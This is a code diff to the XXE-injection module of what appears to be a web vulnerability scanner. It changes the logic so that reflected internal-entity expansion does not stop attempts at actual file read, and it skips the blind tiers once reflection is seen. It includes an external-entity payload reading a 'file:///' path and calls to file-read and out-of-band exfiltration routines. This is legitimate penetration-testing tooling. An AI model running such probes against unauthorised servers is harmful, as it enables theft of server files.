@@ -656,20 +656,23 @@ def xxeScan():
     logger.info("testing XXE injection on the XML request body (root element: '%s')" % rootName)
 
     baseline = _send(xml)
-    found = False
+    found = False           # an actual impact/oracle (file read, error-based, XInclude, blind)
+    expansionSeen = False   # reflected DTD/internal-entity processing (weaker; must not stop the search)
 
     # T2: in-band reflected DTD/internal-entity expansion. This proves the parser
-    # processes entities; it is NOT yet external-entity file-read impact - so the
-    # finding is worded conservatively and escalated only if an actual read follows.
+    # processes entities but is NOT yet file-read impact, so it deliberately does NOT
+    # set `found` - the in-band read (or, if that fails, the error/XInclude tiers) still
+    # run to try to upgrade a mere "expansion confirmed" into actual file-read impact.
     payload, page = _tryInternal(xml, rootName, baseline)
     if payload:
-        found = True
+        expansionSeen = True
         logger.info("the XML body processes DTD/internal entities (in-band reflection confirmed)")
         _report("In-band DTD/internal entity expansion", payload)
 
         if conf.get("fileRead"):
             content = _tryInbandFileRead(xml, rootName, conf.fileRead)
             if content:
+                found = True
                 logger.info("in-band XXE file-read impact confirmed for '%s'" % conf.fileRead)
                 _report("In-band file read ('%s')" % conf.fileRead, "<in-band reflected read of '%s'>" % conf.fileRead)
                 _dumpFileRead(conf.fileRead, content)
@@ -680,12 +683,15 @@ def xxeScan():
                 snippet = _tryPhpFilter(xml, rootName, baseline)
                 systemId = "php://filter" if snippet else None
             if systemId:
+                found = True
                 logger.info("in-band XXE file-read impact confirmed (external entity, e.g. '%s')" % systemId)
                 _report("In-band file-read impact (external entity '%s')" % systemId, "<external-entity read of a benign file for impact>")
 
-    # T3: error-based (works where entities are not reflected but errors leak)
+    # T3: error-based (works where entities are not reflected but errors leak). A
+    # redundant detection channel once in-band reflection was already seen, so it is
+    # skipped then - the file-read *impact* tiers below still run to try to upgrade.
     errorChannel = False
-    if not found:
+    if not found and not expansionSeen:
         payload, page = _tryError(xml, rootName)
         if payload:
             found = errorChannel = True
@@ -693,8 +699,8 @@ def xxeScan():
             logger.info("the XML body is vulnerable to XXE injection (error-based, back-end parser: '%s')" % backend)
             _report("Error-based (parameter entity, back-end: '%s')" % backend, payload)
 
-    # T3b: no-egress error-based via local-DTD repurposing
-    if not found:
+    # T3b: no-egress error-based via local-DTD repurposing (detection; skip once reflected)
+    if not found and not expansionSeen:
         payload, page = _tryLocalDtd(xml, rootName)
         if payload:
             found = errorChannel = True
@@ -721,16 +727,20 @@ def xxeScan():
             logger.info("the XML body is vulnerable to XInclude file read ('%s'): '%s'" % (systemId, snippet))
             _report("XInclude file read ('%s')" % systemId, payload)
 
-    # T5: WAF-evasion fallbacks (UTF-16 re-encoding, PUBLIC-for-SYSTEM)
-    if not found:
+    # T5: WAF-evasion fallbacks (UTF-16 re-encoding, PUBLIC-for-SYSTEM). The UTF-16
+    # variant re-detects internal-entity reflection, so it is redundant (and mislabels
+    # as 'evasion') once reflection was already seen - skip it then.
+    if not found and not expansionSeen:
         title, payload = _tryEvasions(xml, rootName, baseline)
         if title:
             found = True
             logger.info("the XML body is vulnerable to XXE injection (%s)" % title.lower())
             _report(title, payload)
 
-    # T6: time-based blind (no collector, no third party) - external entity to a non-routable host
-    if not found:
+    # T6: time-based blind (no collector, no third party) - external entity to a non-routable host.
+    # Skipped once in-band reflection worked: the target is demonstrably not blind, so the (slow)
+    # blind tiers add nothing and would needlessly stall.
+    if not found and not expansionSeen:
         logger.debug("attempting time-based blind XXE (external entity to a non-routable host); this can be slow")
         payload = _tryTimeBlind(xml, rootName)
         if payload:
@@ -738,10 +748,11 @@ def xxeScan():
             logger.info("the XML body is vulnerable to XXE injection (time-based blind, external entity resolution reaches out-of-band)")
             _report("Time-based blind (external entity to non-routable host)", payload)
 
-    # T7: out-of-band tiers - THIRD PARTY, so only on explicit consent (default NO).
+    # T7: out-of-band tiers - THIRD PARTY, so only on explicit consent (default NO). Also blind-only
+    # (skipped when in-band reflection already worked, so a non-blind target never triggers the prompt).
     # Low-impact callback confirmation is the default; actual file exfiltration is
     # attempted only when the user explicitly asked for a file via '--file-read'.
-    if not found and _oobConsent():
+    if not found and not expansionSeen and _oobConsent():
         if conf.get("fileRead"):
             exfil = _tryOobExfil(xml, rootName)
             if exfil and (exfil["content"] or exfil["detected"]):
@@ -762,6 +773,12 @@ def xxeScan():
                 _report("Out-of-band blind (collector callback: %s)" % protocol, payload)
 
     if not found:
+        if expansionSeen:
+            # in-band entity processing is real, but no external-entity/blind oracle was reachable
+            # (typically external entities disabled) - report honestly rather than overstate impact
+            logger.info("DTD/internal entity processing is enabled, but no external-entity file-read or blind XXE oracle was established")
+            logger.info("XXE scan complete")
+            return
         # Reachable-but-not-exploitable diagnostics: distinguish a hardened parser
         # from a merely non-reflecting one so the user knows why it did not fire.
         probe = _send(_buildDoctype(xml, rootName, '<!ENTITY %% p SYSTEM "file:///%s">%%p;' % SENTINEL))
